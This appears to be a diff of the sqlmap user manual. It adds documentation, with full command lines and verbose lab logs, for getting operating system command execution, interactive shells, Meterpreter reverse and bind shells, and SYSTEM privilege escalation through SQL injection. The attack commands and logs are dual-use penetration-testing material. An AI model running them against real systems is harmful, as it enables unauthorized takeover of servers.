+[hh:mm:52] [INFO] retrieved: 31744
+[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
+same size as the local file '/tmp/nc.exe.packed'
 </verb></tscreen>
 
 
 <sect1>Operating system access
 
-<sect2>Execute an operating system command
+<sect2>Execute arbitrary operating system command
 
 <p>
-Option: <tt>--os-cmd</tt>
+Options: <tt>--os-cmd</tt> and <tt>--os-shell</tt>
 
 <p>
-TODO
+It is possible to execute arbitrary commands on the underlying operating
+system when the back-end database management system is either MySQL,
+PostgreSQL or Microsoft SQL Server and the session user has the needed
+privileges to abuse database specific functionalities and architectural
+weaknesses.
 
 <p>
-The techniques implemented are detailed on the white paper
+On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality
+demonstrated above) a shared library (binary file) containing two
+user-defined functions, <tt>sys_exec()</tt> and <tt>sys_eval()</tt>, then
+it creates these two functions on the database and call one of them to
+execute the specified command, depending on the user's choice to display
+the standard output or not.
+On Microsoft SQL Server, sqlmap abuses the <tt>xp_cmshell</tt> stored
+procedure: if it's disable sqlmap re-enables it, if it does not exist,
+sqlmap creates it from scratch.
+
+<p>
+If the user wants to retrieve the command standard output, sqlmap will use
+one of the enumeration SQL injection techniques (blind or inband) to
+retrieve it, viceversa sqlmap will use the stacked query SQL injection
+technique to execute the command without returning anything to the user.
+
+<p>
+These techniques are detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
-
-<sect2>Prompt for an interactive operating system shell
+<p>
+It is possible to specify a single command to be executed with the
+<tt>--os-cmd</tt> option.
 
 <p>
-Option: <tt>--os-shell</tt>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.aspx?id=1" \
+  --os-cmd "whoami" -v 1
+
+[...]
+[hh:mm:05] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: PostgreSQL
+
+[hh:mm:05] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:05] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:05] [INFO] retrieved: 8.3.5,
+[hh:mm:15] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:15] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:15] [INFO] retrieved: 1
+[hh:mm:16] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:16] [INFO] testing if current user is DBA
+[hh:mm:16] [INFO] retrieved: 1
+[hh:mm:16] [INFO] checking if sys_exec UDF already exist
+[hh:mm:16] [INFO] retrieved: 0
+[hh:mm:18] [INFO] checking if sys_eval UDF already exist
+[hh:mm:18] [INFO] retrieved: 0
+[hh:mm:20] [INFO] creating sys_exec UDF from the binary UDF file
+[hh:mm:20] [INFO] creating sys_eval UDF from the binary UDF file
+do you want to retrieve the command standard output? [Y/n] 
+[hh:mm:35] [INFO] retrieved: w2k3dev\postgres
+command standard output:    'w2k3dev\postgres'
+</verb></tscreen>
 
 <p>
-TODO
+Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+  --os-cmd "whoami" --union-use -v 1
+
+[...]
+[hh:mm:58] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:58] [INFO] testing inband sql injection on parameter 'name' with NULL bruteforcing 
+technique
+[hh:mm:58] [INFO] confirming full inband sql injection on parameter 'name'
+[hh:mm:58] [WARNING] the target url is not affected by an exploitable full inband sql 
+injection vulnerability
+[hh:mm:58] [INFO] confirming partial (single entry) inband sql injection on parameter 'name' 
+by appending a false condition after the parameter value
+[hh:mm:58] [INFO] the target url is affected by an exploitable partial (single entry) inband 
+sql injection vulnerability
+valid union:    'http://192.168.1.121:80/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
+ALL SELECT NULL, NULL, NULL-- AND 'SonLv'='SonLv'
+
+[hh:mm:58] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:03] [INFO] the web application supports stacked queries on parameter 'name'
+[hh:mm:03] [INFO] testing if current user is DBA
+[hh:mm:03] [INFO] checking if xp_cmdshell extended procedure is available, wait..
+[hh:mm:09] [INFO] xp_cmdshell extended procedure is available
+do you want to retrieve the command standard output? [Y/n] 
+[hh:mm:11] [INFO] the SQL query provided returns 1 entries
+command standard output:
+---
+nt authority\network service
+---
+</verb></tscreen>
 
 <p>
-The techniques implemented are detailed on the white paper
-<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+It is also possible to simulate a real shell where you can type as many
+arbitrary commands as you wish. The option is <tt>--os-shell</tt> and has
+the same TAB completion and history functionalities implemented for
+<tt>--sql-shell</tt>.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+  --os-shell -v 2
+
+[...]
+[hh:mm:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:36] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:36] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:36] [DEBUG] query: IFNULL(CAST(MID((VERSION()), 1, 6) AS CHAR(10000)), CHAR(32))
+[hh:mm:36] [INFO] retrieved: 5.0.67
+[hh:mm:37] [DEBUG] performed 49 queries in 1 seconds
+[hh:mm:37] [DEBUG] query: SELECT SLEEP(5)
+[hh:mm:42] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:42] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:42] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:42] [DEBUG] query: CREATE TABLE sqlmapfile(data text)
+[hh:mm:42] [DEBUG] query: INSERT INTO sqlmapfile(data) VALUES (VERSION())
+[hh:mm:42] [DEBUG] query: SELECT IFNULL(CAST(MID(@@datadir, 1, 1) AS CHAR(10000)), CHAR(32))
+[hh:mm:42] [INFO] retrieved: C
+[hh:mm:42] [DEBUG] performed 14 queries in 0 seconds
+[hh:mm:42] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:42] [DEBUG] cleaning up the database management system
+[hh:mm:42] [DEBUG] removing support tables
+[hh:mm:42] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:42] [INFO] testing if current user is DBA
+[hh:mm:42] [DEBUG] query: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=
+(SUBSTRING_INDEX(CURRENT_USER(), CHAR(64), 1)) LIMIT 0, 1)=CHAR(89)) THEN 1 ELSE 0 END)
+[hh:mm:42] [INFO] retrieved: 1
+[hh:mm:43] [DEBUG] performed 5 queries in 0 seconds
+[hh:mm:43] [INFO] checking if sys_exec UDF already exist
+[hh:mm:43] [DEBUG] query: SELECT (CASE WHEN ((SELECT name FROM mysql.func WHERE name=
+CHAR(115,121,115,95,101,120,101,99) LIMIT 0, 1)=CHAR(115,121,115,95,101,120,101,99)) 
+THEN 1 ELSE 0 END)
+[hh:mm:43] [INFO] retrieved: 0
+[hh:mm:43] [DEBUG] performed 14 queries in 0 seconds
+[hh:mm:43] [INFO] checking if sys_eval UDF already exist
+[hh:mm:43] [DEBUG] query: SELECT (CASE WHEN ((SELECT name FROM mysql.func WHERE name=
+CHAR(115,121,115,95,101,118,97,108) LIMIT 0, 1)=CHAR(115,121,115,95,101,118,97,108)) 
+THEN 1 ELSE 0 END)
+[hh:mm:43] [INFO] retrieved: 0
+[hh:mm:43] [DEBUG] performed 14 queries in 0 seconds
+[hh:mm:43] [DEBUG] going to upload the binary file with stacked query SQL injection technique
+[hh:mm:43] [DEBUG] creating a support table to write the hexadecimal encoded file to
+[hh:mm:43] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:43] [DEBUG] query: CREATE TABLE sqlmapfile(data longblob)
+[hh:mm:43] [DEBUG] encoding file to its hexadecimal string value
+[hh:mm:43] [DEBUG] forging SQL statements to write the hexadecimal encoded file to the 
+support table
+[hh:mm:43] [DEBUG] inserting the hexadecimal encoded file to the support table
+[hh:mm:43] [DEBUG] query: INSERT INTO sqlmapfile(data) VALUES (0x4d5a90 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x000000 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0xffcbff [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x490068 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x1c5485 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x14cc63 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x207665 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x5c5379 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x0e5bc2 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x505357 [...])
+[hh:mm:43] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x000000 [...])
+[hh:mm:44] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0x696372 [...])
+[hh:mm:44] [DEBUG] query: UPDATE sqlmapfile SET data=CONCAT(data,0xdd8400 [...])
+[hh:mm:44] [DEBUG] exporting the binary file content to file './libsqlmapudftxxgk.dll'
+[hh:mm:44] [DEBUG] query: SELECT data FROM sqlmapfile INTO DUMPFILE './libsqlmapudftxxgk.dll'
+[hh:mm:44] [DEBUG] cleaning up the database management system
+[hh:mm:44] [DEBUG] removing support tables
+[hh:mm:44] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:44] [INFO] creating sys_exec UDF from the binary UDF file
+[hh:mm:44] [DEBUG] query: DROP FUNCTION sys_exec
+[hh:mm:44] [DEBUG] query: CREATE FUNCTION sys_exec RETURNS int SONAME 'libsqlmapudftxxgk.dll'
+[hh:mm:44] [INFO] creating sys_eval UDF from the binary UDF file
+[hh:mm:44] [DEBUG] query: DROP FUNCTION sys_eval
+[hh:mm:44] [DEBUG] query: CREATE FUNCTION sys_eval RETURNS string SONAME 
+'libsqlmapudftxxgk.dll'
+[hh:mm:44] [DEBUG] creating a support table to write commands standard output to
+[hh:mm:44] [DEBUG] query: DROP TABLE sqlmapoutput
+[hh:mm:44] [DEBUG] query: CREATE TABLE sqlmapoutput(data longtext)
+[hh:mm:44] [INFO] going to use injected sys_eval and sys_exec user-defined functions for 
+operating system command execution
+[hh:mm:44] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n] 
+[hh:mm:41] [DEBUG] query: INSERT INTO sqlmapoutput(data) VALUES (sys_eval('whoami'))
+[hh:mm:41] [DEBUG] query: SELECT IFNULL(CAST(data AS CHAR(10000)), CHAR(32)) FROM 
+sqlmapoutput
+[hh:mm:41] [INFO] retrieved: nt authority\system
+[hh:mm:44] [DEBUG] performed 140 queries in 2 seconds
+[hh:mm:44] [DEBUG] query: DELETE FROM sqlmapoutput
+command standard output:    'nt authority\system'
+
+os-shell> [TAB TAB]
+copy         del          dir          echo         md           mem          move         
+net          netstat -na  ver          whoami       xcopy        
+
+os-shell> exit
+[hh:mm:51] [INFO] cleaning up the database management system
+[hh:mm:51] [DEBUG] removing support tables
+[hh:mm:51] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:51] [DEBUG] query: DROP TABLE sqlmapoutput
+do you want to remove sys_exec UDF? [Y/n] n
+do you want to remove sys_eval UDF? [Y/n] n
+[hh:mm:04] [INFO] database management system cleanup finished
+[hh:mm:04] [WARNING] remember that UDF dynamic-link library files saved on the file system 
+can only be deleted manually
+</verb></tscreen>
+
+<p>
+Now run it again, but specifying the <tt>--union-use</tt> to retrieve the
+command standard output quicker, via UNION based SQL injection, when the
+parameter is affected also by inband SQL injection vulnerability:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+  --os-shell -v 2 --union-use
+
+[...]
+[hh:mm:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:16] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
+technique
+[hh:mm:16] [INFO] confirming full inband sql injection on parameter 'id'
+[hh:mm:16] [INFO] the target url is affected by an exploitable full inband sql injection 
+vulnerability
+valid union:    'http://192.168.1.121:80/sqlmap/mysql/iis/get_int.aspx?id=1 UNION ALL SELECT 
+NULL, NULL, NULL# AND 528=528'
+
+[hh:mm:16] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:16] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:16] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),
+MID((VERSION()), 1, 6),CHAR(117,114,115,75,117,102)), NULL# AND 3173=3173
+[hh:mm:16] [DEBUG] performed 1 queries in 0 seconds
+[hh:mm:16] [DEBUG] query: SELECT SLEEP(5)
+[hh:mm:21] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:21] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:21] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:21] [DEBUG] query: CREATE TABLE sqlmapfile(data text)
+[hh:mm:21] [DEBUG] query: INSERT INTO sqlmapfile(data) VALUES (VERSION())
+[hh:mm:21] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),
+MID(@@datadir, 1, 1),CHAR(117,114,115,75,117,102)), NULL# AND 6574=6574
+[hh:mm:21] [DEBUG] performed 1 queries in 0 seconds
+[hh:mm:21] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:21] [DEBUG] cleaning up the database management system
+[hh:mm:21] [DEBUG] removing support tables
+[hh:mm:21] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:21] [INFO] testing if current user is DBA
+[hh:mm:21] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),(CASE 
+WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), CHAR(64), 
+1)) LIMIT 0, 1)=CHAR(89)) THEN 1 ELSE 0 END),CHAR(117,114,115,75,117,102)), NULL# AND 19=19
+[hh:mm:21] [DEBUG] performed 1 queries in 0 seconds
+[hh:mm:21] [INFO] checking if sys_exec UDF already exist
+[hh:mm:21] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),(CASE WHEN 
+((SELECT name FROM mysql.func WHERE name=CHAR(115,121,115,95,101,120,101,99) LIMIT 0, 1)=
+CHAR(115,121,115,95,101,120,101,99)) THEN 1 ELSE 0 END),CHAR(117,114,115,75,117,102)), NULL# 
+AND 4900=4900
+[hh:mm:21] [DEBUG] performed 1 queries in 0 seconds
+sys_exec UDF already exists, do you want to overwrite it? [y/N] n
+[hh:mm:24] [INFO] checking if sys_eval UDF already exist
+[hh:mm:24] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),(CASE WHEN 
+((SELECT name FROM mysql.func WHERE name=CHAR(115,121,115,95,101,118,97,108) LIMIT 0, 1)=
+CHAR(115,121,115,95,101,118,97,108)) THEN 1 ELSE 0 END),CHAR(117,114,115,75,117,102)), NULL# 
+AND 4437=4437
+[hh:mm:24] [DEBUG] performed 1 queries in 0 seconds
+sys_eval UDF already exists, do you want to overwrite it? [y/N] n
+[hh:mm:25] [DEBUG] keeping existing sys_exec UDF as requested
+[hh:mm:25] [DEBUG] keeping existing sys_eval UDF as requested
+[hh:mm:25] [DEBUG] creating a support table to write commands standard output to
+[hh:mm:25] [DEBUG] query: DROP TABLE sqlmapoutput
+[hh:mm:25] [DEBUG] query: CREATE TABLE sqlmapoutput(data longtext)
+[hh:mm:25] [INFO] going to use injected sys_eval and sys_exec user-defined functions for 
+operating system command execution
+[hh:mm:25] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> ipconfig
+do you want to retrieve the command standard output? [Y/n] 
+[hh:mm:29] [DEBUG] query: INSERT INTO sqlmapoutput(data) VALUES (sys_eval('ipconfig'))
+[hh:mm:29] [DEBUG] query:  UNION ALL SELECT NULL, CONCAT(CHAR(83,81,73,103,75,77),IFNULL(CAST
+(data AS CHAR(10000)), CHAR(32)),CHAR(117,114,115,75,117,102)), NULL FROM sqlmapoutput# AND 
+7106=7106
+[hh:mm:29] [DEBUG] performed 1 queries in 0 seconds
+[hh:mm:29] [DEBUG] query: DELETE FROM sqlmapoutput
+command standard output:
+---
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : localdomain
+   IP Address. . . . . . . . . . . . : 192.168.1.121
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+---Default Gateway . . . . . . . . . : 192.168.1.1
+
+os-shell> exit
+[hh:mm:41] [INFO] cleaning up the database management system
+[hh:mm:41] [DEBUG] removing support tables
+[hh:mm:41] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:41] [DEBUG] query: DROP TABLE sqlmapoutput
+do you want to remove sys_exec UDF? [Y/n] n
+do you want to remove sys_eval UDF? [Y/n] n
+[hh:mm:54] [INFO] database management system cleanup finished
+[hh:mm:54] [WARNING] remember that UDF dynamic-link library files saved on the file system 
+can only be deleted manually
+</verb></tscreen>
+
+<p>
+As you can see from this second example, sqlmap firstly check if the two
+user-defined functions are already created, if so, it asks the user if he
+wants to recreate them or keep them and save time.
 
 
 <sect2>Prompt for an out-of-band shell, meterpreter or VNC
@@ -3996,11 +4351,250 @@ The techniques implemented are detailed on the white paper
 Options: <tt>--os-pwn</tt>, <tt>--priv-esc</tt>, <tt>--msf-path</tt> and <tt>--tmp-path</tt>
 
 <p>
-TODO
+It is possible to establish an <bf>out-of-band TCP stateful channel</bf>
+between the attacker and the underlying operating system by using the
+exploited SQL injection as a stepping stone. This is implemented for MySQL,
+PostgreSQL and Microsoft SQL Server.
+sqlmap relies on the <htmlurl url="http://metasploit.com/framework"
+name="Metasploit"> to perform this attack, so you need to have it already
+on your system: it's free and can be downloaded from the homepage. It is
+advised to use Metasploit 3.3 development version from the subversion
+repository.
 
 <p>
-The techniques implemented are detailed on the white paper
+Note that this feature is not supported by sqlmap running on Windows
+because Metasploit's msfconsole and msfcli are not supported on the native
+Windows Ruby interpreter.
+
+<p>
+These techniques are detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+  --os-pwn -v 1 --msf-path /home/inquis/software/metasploit
+
+[...]
+[hh:mm:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:17] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:17] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:17] [INFO] retrieved: 5.0.67
+[hh:mm:23] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:23] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:23] [INFO] retrieved: C
+[hh:mm:23] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:23] [INFO] testing if current user is DBA
+[hh:mm:23] [INFO] retrieved: 1
+[hh:mm:23] [INFO] checking if sys_exec UDF already exist
+[hh:mm:23] [INFO] retrieved: 1
+[hh:mm:24] [INFO] sys_exec UDF already exists, do you want to overwrite it? [y/N] N
+[hh:mm:24] [INFO] checking if sys_eval UDF already exist
+[hh:mm:24] [INFO] retrieved: 1
+[hh:mm:24] [INFO] sys_eval UDF already exists, do you want to overwrite it? [y/N] N
+[hh:mm:24] [INFO] creating Metasploit Framework 3 payload stager
+[hh:mm:24] [INFO] which connection type do you want to use?
+[1] Bind TCP (default)
+[2] Bind TCP (No NX)
+[3] Reverse TCP
+[4] Reverse TCP (No NX)
+> 1
+[hh:mm:24] [INFO] which is the back-end DBMS address? [192.168.1.121] 192.168.1.121
+[hh:mm:24] [INFO] which remote port numer do you want to use? [61588] 61588
+[hh:mm:24] [INFO] which payload do you want to use?
+[1] Reflective Meterpreter (default)
+[2] PatchUp Meterpreter (only from Metasploit development revision 6742)
+[3] Shell
+[4] Reflective VNC
+[5] PatchUp VNC (only from Metasploit development revision 6742)
+> 1
+[hh:mm:24] [INFO] which payload encoding do you want to use?
+[1] No Encoder
+[2] Alpha2 Alphanumeric Mixedcase Encoder
+[3] Alpha2 Alphanumeric Uppercase Encoder
+[4] Avoid UTF8/tolower
+[5] Call+4 Dword XOR Encoder
+[6] Single-byte XOR Countdown Encoder
+[7] Variable-length Fnstenv/mov Dword XOR Encoder
+[8] Polymorphic Jump/Call XOR Additive Feedback Encoder
+[9] Non-Alpha Encoder
+[10] Non-Upper Encoder
+[11] Polymorphic XOR Additive Feedback Encoder (default)
+[12] Alpha2 Alphanumeric Unicode Mixedcase Encoder
+[13] Alpha2 Alphanumeric Unicode Uppercase Encoder
+> 11
+[hh:mm:24] [INFO] creation in progress .................. done
+[hh:mm:42] [INFO] compression in progress . quit unexpectedly with return code 1
+[hh:mm:43] [INFO] failed to compress the file because you provided a Metasploit version 
+above 3.3-dev revision 6681. This will not inficiate the correct execution of sqlmap. 
+It might only slow down a bit the execution of sqlmap
+[hh:mm:43] [INFO] uploading payload stager to 'C:/WINDOWS/Temp/sqlmapmsfgcpge.exe'
+[hh:mm:44] [INFO] running Metasploit Framework 3 command line interface locally, wait..
+[hh:mm:44] [INFO] running Metasploit Framework 3 payload stager remotely, wait..
+[*] Please wait while we load the module tree...
+[*] Started bind handler
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+[*] Sending stage (718336 bytes)
+[*] Meterpreter session 1 opened (192.168.1.161:47832 -> 192.168.1.121:61588)
+
+meterpreter > Loading extension priv...success.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+
+VMware Accelerated AMD PCNet Adapter
+Hardware MAC: 00:0c:29:29:ee:86
+IP Address  : 192.168.1.121
+Netmask     : 255.255.255.0
+
+
+meterpreter > pwd
+C:\Program Files\MySQL\MySQL Server 5.0\Data
+meterpreter > exit
+</verb></tscreen>
+
+<p>
+By default MySQL on Windows runs as <tt>SYSTEM</tt>, however PostgreSQL
+run as a low-privileged user <tt>postgres</tt> on both Windows and Linux.
+Microsoft SQL Server 2000 by default runs as <tt>SYSTEM</tt>, whereas
+Microsoft SQL Server 2005 and 2008 run most of the times as <tt>NETWORK
+SERVICE</tt> and sometimes as <tt>LOCAL SERVICE</tt>.
+
+It is possible to provide sqlmap with the <tt>--priv-esc</tt> option to
+abuse Windows access tokens and escalate privileges to <tt>SYSTEM</tt>
+within the Meterpreter session created if the underlying operating system
+is not patched against Microsoft Security Bulletin
+<htmlurl url="http://www.microsoft.com/technet/security/Bulletin/MS09-012.mspx" name="MS09-012">.
+sqlmap performs the
+<htmlurl url="http://www.argeniss.com/research/TokenKidnapping.pdf" name="Windows Token kidnapping">
+technique by uploading <htmlurl url="http://www.argeniss.com/research/Churrasco.zip" name="Churrasco">
+local exploit and using it to call the Metasploit's payload stager
+executable. sqlmap uses also the Metasploit's Meterpreter
+<htmlurl url="http://sourceforge.net/projects/incognito/" name="incognito">
+extension to abused Windows access tokens in conjunction to Churrasco
+stand-alone exploit if the user wants so.
+
+<p>
+Note that this feature is not supported by sqlmap installed from the
+DEB package because it relies on Churrasco, which is not explicitly free
+software so it has not been included in the package.
+
+<p>
+This technique is detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> running as
+<tt>NETWORK SERVICE</tt> on the target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+  --os-pwn -v 1 --msf-path /home/inquis/software/metasploit --priv-esc
+
+[...]
+[hh:mm:17] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:17] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:22] [INFO] the web application supports stacked queries on parameter 'name'
+[hh:mm:22] [INFO] testing if current user is DBA
+[hh:mm:22] [INFO] retrieved: 1
+[hh:mm:23] [INFO] checking if xp_cmdshell extended procedure is available, wait..
+[hh:mm:29] [INFO] xp_cmdshell extended procedure is available
+[hh:mm:29] [INFO] creating Metasploit Framework 3 payload stager
+which connection type do you want to use?
+[1] Bind TCP (default)
+[2] Bind TCP (No NX)
+[3] Reverse TCP
+[4] Reverse TCP (No NX)
+> 3
+which is the local address? [192.168.1.161] 
+which local port numer do you want to use? [61499] 
+[hh:mm:54] [INFO] forcing Metasploit payload to Meterpreter because it is the only payload 
+that can be used to abuse Windows Impersonation Tokens via Meterpreter 'incognito' 
+extension to privilege escalate
+which payload encoding do you want to use?
+[1] No Encoder
+[2] Alpha2 Alphanumeric Mixedcase Encoder
+[3] Alpha2 Alphanumeric Uppercase Encoder
+[4] Avoid UTF8/tolower
+[5] Call+4 Dword XOR Encoder
+[6] Single-byte XOR Countdown Encoder
+[7] Variable-length Fnstenv/mov Dword XOR Encoder
+[8] Polymorphic Jump/Call XOR Additive Feedback Encoder
+[9] Non-Alpha Encoder
+[10] Non-Upper Encoder
+[11] Polymorphic XOR Additive Feedback Encoder (default)
+[12] Alpha2 Alphanumeric Unicode Mixedcase Encoder
+[13] Alpha2 Alphanumeric Unicode Uppercase Encoder
+> 
+[hh:mm:58] [INFO] creation in progress .................. done
+[hh:mm:16] [INFO] compression in progress . quit unexpectedly with return code 1
+[hh:mm:17] [INFO] failed to compress the file because you provided a Metasploit version 
+above 3.3-dev revision 6681. This will not inficiate the correct execution of sqlmap. 
+It might only slow down a bit the execution of sqlmap
+[hh:mm:17] [INFO] uploading payload stager to 'C:/WINDOWS/Temp/sqlmapmsfyahls.exe'
+[hh:mm:20] [WARNING] often Microsoft SQL Server 2005 runs as Network Service which has no 
+Windows Impersonation Tokens within all threads, this makes Meterpreter's incognito 
+extension to fail to list tokens
+do you want sqlmap to upload Churrasco and call the Metasploit payload stager as its 
+argument so that it will be started as SYSTEM? [Y/n] y
+[hh:mm:36] [INFO] the binary file is bigger than 65280 bytes. sqlmap will split it into 
+chunks, upload them and recreate the original file out of the binary chunks server-side, 
+wait..
+[hh:mm:22] [INFO] file chunk 1 written
+[14:10:06] [INFO] file chunk 2 written
+[14:10:06] [INFO] running Metasploit Framework 3 command line interface locally, wait..
+[*] Please wait while we load the module tree...
+[*] Handler binding to LHOST 0.0.0.0
+[*] Started reverse handler
+[*] Starting the payload handler...
+[14:10:31] [INFO] running Metasploit Framework 3 payload stager remotely, wait..
+[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+[*] Sending stage (718336 bytes)
+[*] Meterpreter session 1 opened (192.168.1.161:61499 -> 192.168.1.131:3221)
+
+meterpreter > 
+[14:11:01] [INFO] loading Meterpreter 'incognito' extension and displaying the list of 
+Access Tokens availables. Choose which user you want to impersonate by using incognito's 
+command 'impersonate_token'
+Loading extension priv...success.
+meterpreter > Loading extension incognito...success.
+meterpreter > Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+Delegation Tokens Available
+========================================
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+W2K3DEV\Administrator
+W2K3DEV\IUSR_WIN2003
+W2K3DEV\postgres
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\ANONYMOUS LOGON
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > exit
+</verb></tscreen>
 
 
 <sect2>One click prompt for an out-of-band shell, meterpreter or VNC
@@ -4009,11 +4603,157 @@ The techniques implemented are detailed on the white paper
 Options: <tt>--os-smbrelay</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
 
 <p>
-TODO
+If the back-end database management system runs as <tt>Administrator</tt>
